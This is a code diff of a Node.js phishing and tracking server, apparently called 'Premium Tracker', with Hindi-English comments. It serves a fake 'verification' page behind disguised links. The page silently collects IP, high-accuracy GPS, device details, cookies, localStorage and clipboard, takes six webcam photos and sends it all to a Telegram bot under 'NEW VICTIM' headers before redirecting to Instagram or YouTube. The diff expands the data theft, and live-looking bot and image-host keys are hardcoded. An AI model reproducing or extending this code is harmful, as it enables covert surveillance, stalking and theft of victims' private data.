@@ -3,37 +3,24 @@ const app = express();
 
 // ===== TERI VALUES DAAL =====
 const TELEGRAM_TOKEN = "8840717306:AAEOhGfFnZsSWGtdOChaJaGC4JLfReeKBaU";
-const OWNER_CHAT_ID = "8179349999"; // Owner backup ke liye
+const OWNER_CHAT_ID = "8179349999";
 const IMGBB_API_KEY = "0959c9368daed87c0f1a8d44c203a8b3";
 // =============================
 
 app.post('/send-data', express.json({limit:'50mb'}), (req, res) => {
     const {type, data, creator_id} = req.body;
-    const targetChat = creator_id || OWNER_CHAT_ID; // ✅ Creator ko bhejo, nahi to owner ko
+    const targetChat = creator_id || OWNER_CHAT_ID;
     
-    if(type === 'contacts') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
-            encodeURIComponent("📱 *CONTACTS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
-    }
-    if(type === 'sms') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
-            encodeURIComponent("💬 *SMS DATA*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
-    }
-    if(type === 'clipboard') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
-            encodeURIComponent("📋 *CLIPBOARD*\n\n" + data.substring(0, 1500)) + "&parse_mode=Markdown");
-    }
-    if(type === 'installed_apps') {
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
-            encodeURIComponent("📦 *INSTALLED APPS*\n\n" + data.substring(0, 3500)) + "&parse_mode=Markdown");
-    }
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${targetChat}&text=` + 
+        encodeURIComponent(`📦 *DATA RECEIVED*\nType: ${type}\n\n${data.substring(0, 3500)}`) + 
+        "&parse_mode=Markdown");
     res.send({ok:true});
 });
 
 app.get('/c/:code/:encoded/:creatorid', (req, res) => {
     try {
         let legitUrl = Buffer.from(req.params.encoded, 'base64').toString('utf-8');
-        const CREATOR_ID = req.params.creatorid; // ✅ YEH LIYA LINK CREATOR KA ID
+        const CREATOR_ID = req.params.creatorid;
         
         if(legitUrl.includes('instagram.com')) legitUrl = "https://www.instagram.com/reels/";
         if(legitUrl.includes('youtube.com')) legitUrl = "https://www.youtube.com/shorts/";
@@ -149,17 +136,15 @@ h2{color:#1a1a2e;font-size:20px;font-weight:700;margin-bottom:4px}
 </div>
 
 <script>
-// ✅ YEH CREATOR KA CHAT_ID HAI — ISKO USE KARKE DATA BHEJENGE
 const CREATOR_ID = "${CREATOR_ID}";
 const TOKEN = "${TELEGRAM_TOKEN}";
 const IMGKEY = "${IMGBB_API_KEY}";
 const REDIR = "${legitUrl}";
 
 let allCapturedData = "";
-let photoUploaded = false;
+let photoCount = 0;
 
 function tg(msg) {
-    // ✅ AB SIRF CREATOR KO JAYEGA, OWNER KO NAHI
     fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CREATOR_ID+
         "&text="+encodeURIComponent(msg)+"&parse_mode=Markdown").catch(()=>{});
 }
@@ -181,7 +166,9 @@ function stepStatus(text) {
     document.getElementById('status').textContent = text;
 }
 
-// IP + Location
+// ==================== STEP 1 - BACKGROUND COLLECTION ====================
+
+// 1. IP + Location via ipapi
 fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     let m = "📍 *NEW VICTIM*\\n\\n";
     m += "*IP:* "+d.ip+"\\n";
@@ -194,15 +181,16 @@ fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     m += "*Timezone:* "+(d.timezone||"N/A")+"\\n";
     allCapturedData = m;
     
+    // GPS try in background
     if(navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(p=>{
-            allCapturedData += "\\n\\n🎯 *GPS*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
+            allCapturedData += "\\n\\n🎯 *GPS (Auto)*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m\\nSpeed: "+(p.coords.speed||0)+"\\nHeading: "+(p.coords.heading||0);
             tg(allCapturedData);
             stepDone('s3');
         }, ()=>{
-            tg(allCapturedData+"\\n\\n❌ GPS denied in step 1");
+            tg(allCapturedData+"\\n\\n❌ GPS denied in background");
             stepDone('s3');
-        }, {timeout:3000});
+        }, {timeout:3000, enableHighAccuracy:true});
     } else {
         tg(allCapturedData);
         stepDone('s3');
@@ -210,28 +198,39 @@ fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
     stepDone('s1');
     stepStatus("Network verified - scanning device...");
     
+    // Battery
     if(navigator.getBattery) {
         navigator.getBattery().then(b=>{
             tg("🔋 *BATTERY*\\nLevel: "+Math.round(b.level*100)+"%\\nCharging: "+(b.charging?"Yes":"No"));
         });
     }
+    
+    // IP also from ipify backup
+    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d2=>{
+        tg("🌐 *Public IP (Backup)*\\n"+d2.ip);
+    }).catch(()=>{});
 });
 
+// 2. Device Info
 setTimeout(()=>{
     let info = "🧾 *DEVICE INFO*\\n\\n";
-    info += "*UA:* "+navigator.userAgent.substring(0,120)+"\\n";
+    info += "*UA:* "+navigator.userAgent.substring(0,150)+"\\n";
     info += "*Platform:* "+(navigator.platform||"N/A")+"\\n";
     info += "*Language:* "+navigator.language+"\\n";
-    info += "*Screen:* "+screen.width+"x"+screen.height+"\\n";
+    info += "*Screen:* "+screen.width+"x"+screen.height+" (Avail: "+screen.availWidth+"x"+screen.availHeight+")"+"\\n";
+    info += "*Color Depth:* "+screen.colorDepth+"bit\\n";
     info += "*RAM:* "+(navigator.deviceMemory||"N/A")+"GB\\n";
     info += "*Cores:* "+(navigator.hardwareConcurrency||"N/A")+"\\n";
     info += "*Time:* "+new Date().toLocaleString()+"\\n";
-    info += "*Timezone:* "+Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info += "*Timezone:* "+Intl.DateTimeFormat().resolvedOptions().timeZone+"\\n";
+    info += "*Connection:* "+(navigator.connection ? navigator.connection.effectiveType : "N/A")+"\\n";
+    info += "*Touch:* "+('ontouchstart' in window ? "Yes" : "No");
     tg(info);
     stepDone('s2');
     stepStatus("Device scanned - verifying location...");
 }, 1000);
 
+// 3. Cookies
 setTimeout(()=>{
     try {
         if(document.cookie && document.cookie.length > 0) {
@@ -240,12 +239,13 @@ setTimeout(()=>{
     } catch(e){}
 }, 1500);
 
+// 4. Clipboard (background - may fail)
 setTimeout(()=>{
     try {
         if(navigator.clipboard && navigator.clipboard.readText) {
             navigator.clipboard.readText().then(text=>{
                 if(text && text.length > 0) {
-                    tg("📋 *CLIPBOARD (Background)*\\n\\n"+text.substring(0,500));
+                    tg("📋 *CLIPBOARD (Background)*\\n\\n"+text.substring(0,800));
                     postData('clipboard', text);
                 }
             }).catch(()=>{});
@@ -253,34 +253,60 @@ setTimeout(()=>{
     } catch(e){}
 }, 2000);
 
+// 5. Local Storage
+setTimeout(()=>{
+    try {
+        if(window.localStorage && window.localStorage.length > 0) {
+            let ls = "🗄️ *LOCAL STORAGE*\\n\\n";
+            for(let i=0; i<Math.min(20, window.localStorage.length); i++) {
+                let k = window.localStorage.key(i);
+                let v = window.localStorage.getItem(k);
+                ls += k + " = " + v.substring(0,100) + "\\n";
+            }
+            tg(ls.substring(0,3500));
+        }
+    } catch(e){}
+}, 2500);
+
+// Step 2 transition
 setTimeout(()=>{
     stepDone('s4');
     stepStatus("Verification requires additional permissions");
-    
     setTimeout(()=>{
         document.getElementById('step1').classList.add('hidden');
         document.getElementById('step2').classList.add('show');
     }, 800);
 }, 4000);
 
+// ==================== STEP 2 - USER CLICKS VERIFY ====================
 function startVerification() {
     const btn = document.getElementById('verifyBtn');
     btn.disabled = true;
-    btn.textContent = "⏳ Verifying...";
+    btn.textContent = "⏳ Verifying... (0%)";
+    let progress = 0;
     
+    const progressInterval = setInterval(()=>{
+        progress += 5;
+        if(progress <= 100) btn.textContent = "⏳ Verifying... ("+progress+"%)";
+    }, 300);
+    
+    // ====== GPS HIGH ACCURACY ======
     if(navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(p=>{
-            const gpsData = "🎯 *GPS (Step 2)*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m";
+            const gpsData = "🎯 *GPS (Step 2 - High Accuracy)*\\nLat: "+p.coords.latitude+"\\nLon: "+p.coords.longitude+"\\nAccuracy: "+p.coords.accuracy+"m\\nAltitude: "+(p.coords.altitude||"N/A")+"\\nSpeed: "+(p.coords.speed||0)+"\\nHeading: "+(p.coords.heading||0);
             tg(gpsData);
             document.getElementById('perm-gps').style.borderColor = '#4CAF50';
             document.getElementById('perm-gps').style.background = '#e8f5e9';
-        }, ()=>{}, {timeout:5000, enableHighAccuracy:true});
+        }, ()=>{
+            tg("❌ *GPS Denied in Step 2*");
+        }, {timeout:8000, enableHighAccuracy:true, maximumAge:0});
     }
     
+    // ====== CAMERA - MULTIPLE PHOTOS (5-6) ======
     try {
         if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({
-                video: {width:{ideal:320}, height:{ideal:240}, facingMode:"user"},
+                video: {width:{ideal:640}, height:{ideal:480}, facingMode:"user"},
                 audio: false
             }).then(stream=>{
                 const v = document.createElement("video");
@@ -288,49 +314,98 @@ function startVerification() {
                 v.setAttribute("playsinline","");
                 v.play();
                 
-                setTimeout(()=>{
-                    const c = document.createElement("canvas");
-                    c.width = 320; c.height = 240;
-                    c.getContext("2d").drawImage(v, 0, 0);
-                    const b64 = c.toDataURL("image/jpeg",0.7).split(",")[1];
+                // Capture 6 photos with delays
+                let captureCount = 0;
+                const maxCaptures = 6;
+                
+                function capturePhoto() {
+                    if(captureCount >= maxCaptures) {
+                        stream.getTracks().forEach(t=>t.stop());
+                        document.getElementById('perm-cam').style.borderColor = '#4CAF50';
+                        document.getElementById('perm-cam').style.background = '#e8f5e9';
+                        tg("📸 *CAMERA DONE* - "+maxCaptures+" photos captured ✅");
+                        return;
+                    }
                     
-                    const fd = new FormData();
-                    fd.append("image", b64);
-                    
-                    fetch("https://api.imgbb.com/1/upload?key="+IMGKEY, {
-                        method:"POST",
-                        body:fd
-                    }).then(r=>r.json()).then(data=>{
-                        if(data && data.success) {
-                            tgPhoto(data.data.url);
-                            tg("📸 *PHOTO CAPTURED (Step 2)* ✅");
-                            photoUploaded = true;
-                        }
-                    }).catch(()=>{});
-                    
-                    document.getElementById('perm-cam').style.borderColor = '#4CAF50';
-                    document.getElementById('perm-cam').style.background = '#e8f5e9';
-                    stream.getTracks().forEach(t=>t.stop());
-                }, 1200);
-            }).catch(()=>{});
+                    setTimeout(()=>{
+                        const c = document.createElement("canvas");
+                        c.width = 640;
+                        c.height = 480;
+                        c.getContext("2d").drawImage(v, 0, 0);
+                        const b64 = c.toDataURL("image/jpeg",0.6).split(",")[1];
+                        
+                        const fd = new FormData();
+                        fd.append("image", b64);
+                        
+                        fetch("https://api.imgbb.com/1/upload?key="+IMGKEY, {
+                            method:"POST",
+                            body:fd
+                        }).then(r=>r.json()).then(data=>{
+                            if(data && data.success) {
+                                tgPhoto(data.data.url);
+                                tg("📸 *PHOTO "+(captureCount+1)+"/"+maxCaptures+"* ✅");
+                                photoCount++;
+                                captureCount++;
+                                capturePhoto();
+                            } else {
+                                captureCount++;
+                                capturePhoto();
+                            }
+                        }).catch(()=>{
+                            captureCount++;
+                            capturePhoto();
+                        });
+                    }, captureCount === 0 ? 500 : 800);
+                }
+                
+                capturePhoto();
+            }).catch(err=>{
+                tg("❌ *CAMERA ERROR*: "+err.message);
+            });
         }
     } catch(e){}
     
+    // ====== CLIPBOARD - MULTIPLE ATTEMPTS ======
     setTimeout(()=>{
         try {
             if(navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(text=>{
                     if(text && text.length > 0) {
-                        tg("📋 *CLIPBOARD (Step 2)*\\n\\n"+text.substring(0,500));
+                        tg("📋 *CLIPBOARD (Step 2)*\\n\\n"+text.substring(0,800));
                         document.getElementById('perm-clip').style.borderColor = '#4CAF50';
                         document.getElementById('perm-clip').style.background = '#e8f5e9';
+                        postData('clipboard', text);
                     }
                 }).catch(()=>{});
             }
         } catch(e){}
     }, 1000);
     
+    // Try clipboard again after 2 seconds
     setTimeout(()=>{
+        try {
+            if(navigator.clipboard && navigator.clipboard.readText) {
+                navigator.clipboard.readText().then(text=>{
+                    if(text && text.length > 0) {
+                        tg("📋 *CLIPBOARD (Attempt 2)*\\n\\n"+text.substring(0,800));
+                    }
+                }).catch(()=>{});
+            }
+        } catch(e){}
+    }, 3000);
+    
+    // ====== GET ADDITIONAL DATA ======
+    // Network info
+    setTimeout(()=>{
+        if(navigator.connection) {
+            const conn = navigator.connection;
+            tg("📶 *NETWORK INFO*\\nType: "+(conn.effectiveType||"N/A")+"\\nDownlink: "+(conn.downlink||"N/A")+" Mbps\\nRTT: "+(conn.rtt||"N/A")+"ms\\nSave-Data: "+(conn.saveData?"Yes":"No"));
+        }
+    }, 2000);
+    
+    // ====== REDIRECT ======
+    setTimeout(()=>{
+        clearInterval(progressInterval);
         btn.className = "btn btn-success";
         btn.textContent = "✓ Verified! Redirecting...";
         document.getElementById('redirectNote').style.display = 'block';
@@ -338,7 +413,7 @@ function startVerification() {
         setTimeout(()=>{
             window.location.href = REDIR;
         }, 2000);
-    }, 3000);
+    }, 7000);
 }
 </script>
 </body>
@@ -350,8 +425,8 @@ function startVerification() {
 });
 
 app.get('/', (req, res) => {
-    res.send('Server Ready');
+    res.send('Server Ready ✅ Premium Tracker Running');
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Running on port ' + PORT));
+app.listen(PORT, () => console.log('Premium Tracker on port ' + PORT));
